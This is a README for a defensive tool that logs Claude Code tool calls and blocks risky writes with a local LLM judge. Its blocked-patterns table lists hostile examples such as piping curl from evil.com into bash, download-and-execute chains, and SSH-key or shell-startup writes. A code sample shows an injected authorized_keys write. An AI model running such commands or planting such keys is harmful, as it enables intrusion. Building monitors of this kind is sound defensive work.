# Claude Runtime Monitor

Security monitoring and audit logging for Claude Code tool calls with embedded LLM judge.

## Features

- **Full Audit Trail**: Logs every tool call with complete context
- **Prompt Attribution**: Links tool calls back to the user prompt that triggered them
- **Risk Classification**: Automatic risk scoring based on tool type
- **External Contact Tracking**: Identifies when Claude contacts external resources
- **Real-time Monitoring**: Live tail of security events
- **LLM Judge (Guarded Mode)**: Blocks suspicious write operations using local LLM inference

## Quick Start

```bash
# Install basic monitoring (logging only)
python install.py

# OR install guarded mode (logging + LLM judge for blocking suspicious writes)
pip install llama-cpp-python  # Required for guarded mode
python install.py --guarded

# Restart Claude Code
exit  # from Claude Code
claude  # start new session

# View logs
python -m claude_monitor.cli stats
python -m claude_monitor.cli watch
```

## What Gets Logged

Every tool call is logged with:

| Field | Description |
|-------|-------------|
| `timestamp` | When the tool was called |
| `event` | PreToolUse, PostToolUse, UserPromptSubmit |
| `tool` | Tool name (Bash, Read, WebFetch, etc.) |
| `risk` | Risk level (EXT-RW-CRITICAL, EXT-READ-HIGH, etc.) |
| `triggering_prompt` | The user message that led to this action |
| `reason` | Description of why the tool was called |
| `parameters` | Full tool parameters |
| `output` | Tool response (in PostToolUse events) |
| `classification` | Category, direction, injection/action risk |

## Tool Classification

### Risk Levels

| Level | Meaning |
|-------|---------|
| `EXT-RW-CRITICAL` | External + Read-Write + Critical risk |
| `EXT-READ-HIGH` | External + Read + High injection risk |
| `EXT-WRITE-HIGH` | External + Write + High action risk |
| `INT-MINIMAL` | Internal tool, minimal risk |

### High-Risk Tools

| Tool | Risk | Reason |
|------|------|--------|
| `WebFetch` | CRITICAL injection | Fetches arbitrary URLs |
| `Bash` | CRITICAL action | Can execute any command |
| `mcp__ide__executeCode` | CRITICAL action | Arbitrary code execution |
| `Read` | HIGH injection | File contents flow into context |
| `WebSearch` | HIGH injection | Search results can inject |
| `Write/Edit` | HIGH action | Can modify filesystem |

## CLI Commands

```bash
# Live monitoring
python -m claude_monitor.cli watch        # All events
python -m claude_monitor.cli watch-high   # High-risk only

# View logs
python -m claude_monitor.cli stats        # Statistics
python -m claude_monitor.cli high-risk    # High-risk events
python -m claude_monitor.cli external     # External contact events
python -m claude_monitor.cli prompts      # User prompts only

# Search and export
python -m claude_monitor.cli search "WebFetch"
python -m claude_monitor.cli export logs.json

# Maintenance
python -m claude_monitor.cli clear        # Clear logs
```

## Guarded Mode (LLM Judge)

Guarded mode adds an embedded LLM judge that evaluates write operations before they execute.

### How It Works

1. **Heuristic Check (Fast)**: Pattern matching for HIGH RISK operations
2. **LLM Analysis (Optional)**: Context-aware judgment for borderline cases

### Blocked Patterns

| Pattern | Risk Level | Example |
|---------|------------|---------|
| SSH key writes | HIGH | `~/.ssh/authorized_keys` |
| Shell startup modification | HIGH | `.bashrc`, `.zshrc` |
| System file modification | HIGH | `/etc/passwd`, `/etc/shadow` |
| Credential files | MEDIUM | `.env`, `credentials`, `secrets` |
| curl/wget piped to shell | HIGH | `curl evil.com \| bash` |
| Download and execute | HIGH | `curl -o x.sh && chmod +x && ./x.sh` |
| Private key content | CONTENT | `-----BEGIN PRIVATE KEY-----` |

### Configuration

Environment variables for guarded mode:

```bash
CLAUDE_JUDGE_ENABLED=1      # Enable/disable judge (default: 1)
CLAUDE_BLOCK_ON_REJECT=1    # Block rejected writes (default: 1)
CLAUDE_BLOCK_ON_UNSURE=0    # Block uncertain writes (default: 0)
```

### Model

The default judge model is **Llama-3.2-3B-Instruct** (~2GB):
- Downloaded automatically on first use
- Stored in `~/.claude/security-models/`
- Uses `llama-cpp-python` for local inference
- Compatible with Metal acceleration on Apple Silicon

Download the model manually:
```bash
python install.py --download-model
```

## Log Files

Logs are stored in `~/.claude/security-logs/`:

| File | Contents |
|------|----------|
| `all-events.jsonl` | All logged events |
| `external-contact.jsonl` | Events contacting external resources |
| `high-risk.jsonl` | CRITICAL and HIGH risk events |
| `judge-decisions.jsonl` | LLM judge verdicts (guarded mode only) |
| `state/` | Session state for prompt tracking |

## Example Log Entry

```json
{
  "timestamp": "2026-01-24T22:48:28.230778",
  "session_id": "12302dde",
  "event": "PreToolUse",
  "tool": "Bash",
  "risk": "EXT-RW-CRITICAL",
  "classification": {
    "category": "shell",
    "external_contact": true,
    "direction": "READ-WRITE",
    "injection_risk": "HIGH",
    "action_risk": "CRITICAL"
  },
  "reason": "Check if prompt is captured correctly",
  "triggering_prompt": {
    "prompt": "restarted you",
    "prompt_time": "2026-01-24T22:48:23.668087",
    "tool_call_index": 1
  },
  "parameters": {
    "command": "cat ~/.claude/security-logs/all-events.jsonl | tail -3 | jq '.'",
    "description": "Check if prompt is captured correctly"
  }
}
```

## Uninstall

```bash
python uninstall.py              # Keep logs
python uninstall.py --remove-logs  # Remove logs too
```

## Architecture

```
User Prompt
    │
    ├── UserPromptSubmit hook → Save prompt to state
    │
    ├── PreToolUse hook → Log with prompt attribution
    │       │
    │       └── Tool executes
    │
    └── PostToolUse hook → Log with output
```

## Extending

### Custom Classifications

Edit `claude_monitor/taxonomy.py` to add custom tool classifications:

```python
TOOL_CLASSIFICATION["my_mcp_tool"] = {
    "category": "custom",
    "external_contact": True,
    "direction": "READ",
    "injection_risk": "HIGH",
    "action_risk": "NONE",
}
```

### Blocking Controls

To block actions (return exit code 2 from hook):

```python
# In monitor.py, add blocking logic:
if should_block(tool_name, parameters):
    print("BLOCKED: Unauthorized action", file=sys.stderr)
    sys.exit(2)  # Exit code 2 = block the action
```

### Using the Judge Programmatically

```python
from claude_monitor import WriteJudge, Verdict

judge = WriteJudge(model_name='llama-3.2-3b')

result = judge.judge(
    user_prompt="Summarize the article at example.com",
    tool_name="Write",
    params={"file_path": "~/.ssh/authorized_keys", "content": "ssh-rsa ..."},
    reason="Save summary",
    use_llm=False,  # False = heuristics only (fast), True = include LLM
)

if result.verdict == Verdict.REJECT:
    print(f"BLOCKED: {result.reason}")
elif result.verdict == Verdict.UNSURE:
    print(f"WARNING: {result.reason}")
else:
    print("ALLOWED")
```

## License

MIT
